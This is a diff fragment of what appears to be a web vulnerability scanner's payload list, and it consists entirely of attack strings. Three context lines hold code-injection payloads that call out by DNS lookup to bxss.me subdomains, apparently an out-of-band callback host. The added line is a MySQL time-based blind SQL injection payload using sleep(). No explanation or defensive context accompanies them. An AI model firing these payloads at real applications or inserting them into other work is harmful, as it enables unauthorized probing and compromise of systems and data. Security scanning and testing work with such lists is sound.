@@ -2328,3 +2328,4 @@ geth(ostbyname(lc('hitrc'.'jvtjohbef6c76.bxss.me.')).'A'.chr(67).chr(hex('58')).
 ""+""A"".concat(70-3.concat(22*4).concat(97).concat(85).concat(103).concat(87)+(require""socket"" Socket.gethostbyname(""hiteb""+""ihsbqeai3769a.bxss.me."")[3].to_s)+"")
 '+'A'.concat(70-3.concat(22*4).concat(117).concat(73).concat(118).concat(90)+(require'socket' Socket.gethostbyname('hitjs'+'mktmlxgwe6f3e.bxss.me.')[3].to_s)+')
 'A'.concat(70-3.concat(22*4).concat(102).concat(77).concat(101).concat(86)+(require'socket' Socket.gethostbyname('hitdh'+'ejtfuucn4f0d2.bxss.me.')[3].to_s))
+if(now(=sysdate(),sleep(40.742),0))
